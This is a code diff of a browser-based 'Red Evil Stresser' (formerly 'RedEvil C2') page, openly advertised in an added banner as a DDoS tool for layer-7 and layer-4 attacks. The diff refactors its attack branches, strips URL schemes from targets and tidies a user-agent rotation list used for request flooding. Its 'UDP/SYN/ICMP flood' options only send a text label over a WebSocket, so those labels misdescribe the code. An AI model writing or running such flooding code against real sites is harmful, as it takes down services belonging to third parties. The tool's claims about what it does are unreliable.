@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RedEvil C2</title>
+    <title>Red Evil Stresser</title>
     <style>
         body {
             font-family: 'Arial', sans-serif;
@@ -71,9 +71,10 @@
 </head>
 <body>
     <div id="disclaimer">
+        👺 RedEvil Stresser > is a state-of-the-art DDoS tool engineered to simulate high-intensity distributed denial-of-service attacks. Unlike traditional tools that focus on a single layer, Maskers Storm is a dual-layer powerhouse, capable of launching sophisticated attacks on both Layer 7 and Layer 4. This versatility makes it an indispensable tool for anyone looking to test the resilience of their networks, applications, or infrastructure.
     </div>
     <div id="controls">
-        <h1>RedEvil C2</h1>
+        <h1>Red Evil Stresser</h1>
         <label for="target-url">Target URL:</label>
         <input type="text" id="target-url" placeholder="Your Target Here">
         <label for="attack-type">Attack Type:</label>
@@ -145,35 +146,10 @@
                 fetch(targetUrl, { headers })
                     .then(response => console.log(`Request sent to ${targetUrl} with status ${response.status}`))
                     .catch(error => console.error(`Error sending request to ${targetUrl}: ${error}`));
-            } else if (attackType === 'UDP Flood') {
-                const udpSocket = new WebSocket('ws://' + targetUrl);
-                udpSocket.onopen = function() {
-                    udpSocket.send('UDP Flood');
-                };
-            } else if (attackType === 'SYN Flood') {
-                const synSocket = new WebSocket('ws://' + targetUrl);
-                synSocket.onopen = function() {
-                    synSocket.send('SYN Flood');
-                };
-            } else if (attackType === 'ICMP Flood') {
-                const icmpSocket = new WebSocket('ws://' + targetUrl);
-                icmpSocket.onopen = function() {
-                    icmpSocket.send('ICMP Flood');
-                };
-            } else if (attackType === 'TCP Flood') {
-                const tcpSocket = new WebSocket('ws://' + targetUrl);
-                tcpSocket.onopen = function() {
-                    tcpSocket.send('TCP Flood');
-                };
-            } else if (attackType === 'CloudFlare Bypass') {
-                const cloudflareSocket = new WebSocket('ws://' + targetUrl);
-                cloudflareSocket.onopen = function() {
-                    cloudflareSocket.send('CloudFlare Bypass');
-                };
-            } else if (attackType === 'Discord Voice Attack') {
-                const discordSocket = new WebSocket('ws://' + targetUrl);
-                discordSocket.onopen = function() {
-                    discordSocket.send('Discord Voice Attack');
+            } else if (attackType === 'UDP Flood' || attackType === 'SYN Flood' || attackType === 'ICMP Flood' || attackType === 'TCP Flood' || attackType === 'CloudFlare Bypass' || attackType === 'Discord Voice Attack') {
+                const socket = new WebSocket('ws://' + targetUrl.replace('https://', '').replace('http://', ''));
+                socket.onopen = function() {
+                    socket.send(attackType);
                 };
             } else if (attackType === 'Advanced DDoS') {
                 // Simulate a more powerful and sophisticated DDoS attack
@@ -184,27 +160,27 @@
                         fetch(targetUrl, { headers })
                             .then(response => console.log(`Request sent to ${targetUrl} with status ${response.status}`))
                             .catch(error => console.error(`Error sending request to ${targetUrl}: ${error}`));
-                        const udpSocket = new WebSocket('ws://' + targetUrl);
+                        const udpSocket = new WebSocket('ws://' + targetUrl.replace('https://', '').replace('http://', ''));
                         udpSocket.onopen = function() {
                             udpSocket.send('UDP Flood');
                         };
-                        const synSocket = new WebSocket('ws://' + targetUrl);
+                        const synSocket = new WebSocket('ws://' + targetUrl.replace('https://', '').replace('http://', ''));
                         synSocket.onopen = function() {
                             synSocket.send('SYN Flood');
                         };
-                        const icmpSocket = new WebSocket('ws://' + targetUrl);
+                        const icmpSocket = new WebSocket('ws://' + targetUrl.replace('https://', '').replace('http://', ''));
                         icmpSocket.onopen = function() {
                             icmpSocket.send('ICMP Flood');
                         };
-                        const tcpSocket = new WebSocket('ws://' + targetUrl);
+                        const tcpSocket = new WebSocket('ws://' + targetUrl.replace('https://', '').replace('http://', ''));
                         tcpSocket.onopen = function() {
                             tcpSocket.send('TCP Flood');
                         };
-                        const cloudflareSocket = new WebSocket('ws://' + targetUrl);
+                        const cloudflareSocket = new WebSocket('ws://' + targetUrl.replace('https://', '').replace('http://', ''));
                         cloudflareSocket.onopen = function() {
                             cloudflareSocket.send('CloudFlare Bypass');
                         };
-                        const discordSocket = new WebSocket('ws://' + targetUrl);
+                        const discordSocket = new WebSocket('ws://' + targetUrl.replace('https://', '').replace('http://', ''));
                         discordSocket.onopen = function() {
                             discordSocket.send('Discord Voice Attack');
                         };
@@ -220,8 +196,8 @@
             const endTime = Date.now() + duration * 1000;
             const userAgents = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
-    'Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LGMS323 Build/KOT49I.MS32310c) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Mobile Safari/537.36',
-'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36',
+    'Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LGMS323 Build/KOT49I.MS32310c) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Mobile Safari/537.3',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; EIE11;ENUSMSN; rv:11.0) like Gecko',
 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36',
